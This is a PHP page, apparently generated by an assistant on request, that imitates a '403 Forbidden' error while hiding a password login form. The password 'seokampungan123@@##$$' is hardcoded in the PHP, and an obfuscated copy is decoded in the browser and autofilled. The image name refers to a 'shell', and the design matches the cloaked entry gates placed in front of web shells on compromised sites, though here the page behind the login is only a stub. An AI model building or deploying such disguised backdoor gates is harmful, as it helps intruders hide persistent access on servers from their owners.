<?php
// index.php
// Halaman 403 dengan form password di bawah pesan.
// Client-side obfuscation: XOR -> base64 -> ROT13
// NOTE: Saya mengikuti permintaan Anda; tetap ada obfuscation di sisi klien.
// WARNING: Obfuscation tidak sama dengan enkripsi kuat; seseorang bisa membalik proses di browser.
// Jika Anda menginginkan keamanan yang lebih baik, verifikasi harus murni server-side
// dan jangan menaruh password/aspek rekonstuksi di client.

session_start();

// --- Konfigurasi ---
$PLAIN_PASSWORD = 'seokampungan123@@##$$'; // (sesuai permintaan). Untuk keamanan, ganti dengan hash statis di produksi.
$PASSWORD_HASH = password_hash($PLAIN_PASSWORD, PASSWORD_DEFAULT);

$login_ok = false;
$login_attempt = false;
$msg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $login_attempt = true;
    $given = isset($_POST['pwd']) ? $_POST['pwd'] : '';
    if (password_verify($given, $PASSWORD_HASH)) {
        $login_ok = true;
        $_SESSION['bmlp_authed'] = true;
        $msg = "Login successful. Access granted.";
    } else {
        $msg = "Password salah.";
    }
}

if (!empty($_SESSION['bmlp_authed']) && $_SESSION['bmlp_authed'] === true) {
    header("HTTP/1.1 200 OK");
    echo "<!doctype html><html><head><meta charset='utf-8'><title>Access Granted</title></head><body>";
    echo "<h1>Access Granted</h1>";
    echo "<p>Anda berhasil login.</p>";
    echo "</body></html>";
    exit;
}

header("HTTP/1.1 403 Forbidden");
?>
<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>403 Forbidden</title>
  <style>
    html,body { height:100%; margin:0; font-family: Arial, Helvetica, sans-serif; background:#fff; color:#444; }
    .wrap { min-height:100%; display:flex; align-items:center; justify-content:center; flex-direction:column; padding:40px; box-sizing:border-box; }
    h1 { font-size:140px; margin:0; font-weight:700; color:#4a4a4a; }
    .sub { margin-top:10px; font-size:20px; font-weight:600; }
    .note { margin-top:18px; color:#777; }
    .box { margin-top:18px; border:2px solid #ff0000; padding:8px; width:420px; box-sizing:border-box; }
    .imgwrap { margin-top:30px; max-width:640px; width:90%; }
    .imgwrap img { width:100%; height:auto; display:block; border-radius:6px; box-shadow:0 10px 30px rgba(0,0,0,0.06); }
    form { margin-top:18px; }
    .pwd-input { margin-top:12px; width:420px; max-width:90%; display:flex; gap:8px; align-items:center; }
    input[type="password"] { flex:1; padding:10px 12px; font-size:16px; border:1px solid #ccc; border-radius:4px; outline:none; }
    button[type="submit"] { padding:10px 14px; font-size:16px; border-radius:4px; border:0; cursor:pointer; background:#2d8cff; color:#fff; }
    .hint { margin-top:8px; color:#999; font-size:13px; }
    .msg { margin-top:12px; font-weight:600; color:#b00; }
    .success { color: green; }
    @media (max-width:480px) {
      h1 { font-size:80px; }
      .box, .pwd-input input { width:100%; }
    }
  </style>
</head>
<body>
  <div class="wrap" role="main" aria-labelledby="forbidden-title">
    <h1 id="forbidden-title">403</h1>
    <div class="sub">Forbidden</div>
    <div class="note">Access to this resource on the server is denied!</div>

    <div class="box" aria-hidden="true"></div>

    <div class="imgwrap">
      <img src="contoh foto shell.png" alt="contoh foto shell">
    </div>

    <form method="post" autocomplete="off" onsubmit="return submitGuard();">
      <div class="pwd-input">
        <input id="pwd" name="pwd" type="password" placeholder="Klik di sini atau tekan Tab untuk menampilkan password..." aria-label="Password" />
        <button type="submit">Login</button>
      </div>
      <div class="hint">Tekan Enter untuk submit. Password akan otomatis terisi saat kotak diklik atau saat tekan Tab.</div>
    </form>

    <?php if ($login_attempt): ?>
      <div class="msg <?php if ($login_ok) echo 'success'; ?>"><?php echo htmlspecialchars($msg, ENT_QUOTES|ENT_SUBSTITUTE); ?></div>
    <?php endif; ?>

    <div style="height:40px"></div>
    <div style="font-size:12px; color:#bbb">Server response: 403</div>
  </div>

  <script>
  /************************************************************************
   * Client-side decoding chain: ROT13 -> base64-decode (atob) -> XOR with k
   *
   * Stored obfuscated data is the ROT13 of base64( XOR(password, k) ).
   * Decoding reverses these steps to reconstruct the original password.
   ************************************************************************/

  (function(){
    // Obfuscation key (same used when producing obf)
    var k = 0x4f;

    // Obfuscated payload produced by: rot13( base64encode( xor_bytes ) )
    // (For password "seokampungan123@@##$$" and k=0x4f)
    var ob_rot13 = "CPbtWP4vCmbuXP4usa18Qj9foTge";

    var pwdInput = document.getElementById('pwd');
    var filled = false;

    // rot13 implementation
    function rot13(s) {
      return s.replace(/[A-Za-z]/g, function(c){
        return String.fromCharCode(
          (c <= 'Z' ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26
        );
      });
    }

    // base64 decode (atob) -> returns binary string where each char is a byte
    function base64ToBytes(b64) {
      var bin = atob(b64);
      var bytes = new Uint8Array(bin.length);
      for (var i = 0; i < bin.length; i++) {
        bytes[i] = bin.charCodeAt(i);
      }
      return bytes;
    }

    // XOR bytes with key and convert to string
    function xorBytesToString(bytes, key) {
      var out = '';
      for (var i = 0; i < bytes.length; i++) {
        out += String.fromCharCode(bytes[i] ^ key);
      }
      return out;
    }

    function decodeObfuscated(rot13str) {
      try {
        var b64 = rot13(rot13str);            // undo rot13 -> base64 string
        var bytes = base64ToBytes(b64);      // base64 decode -> Uint8Array of XORed bytes
        var pwd = xorBytesToString(bytes, k);// XOR with key -> original pwd
        return pwd;
      } catch (e) {
        return '';
      }
    }

    var decoded = decodeObfuscated(ob_rot13);

    pwdInput.addEventListener('focus', function(e){
      if (!filled) {
        pwdInput.value = decoded;
        filled = true;
      }
    }, {passive:true});

    window.submitGuard = function() {
      if (!pwdInput.value || pwdInput.value.length < 1) {
        alert('Silakan isi password terlebih dahulu (klik/tap kotak atau tekan Tab).');
        pwdInput.focus();
        return false;
      }
      return true;
    };

    pwdInput.setAttribute('autocomplete','new-password');

  })();
  </script>
</body>
</html>
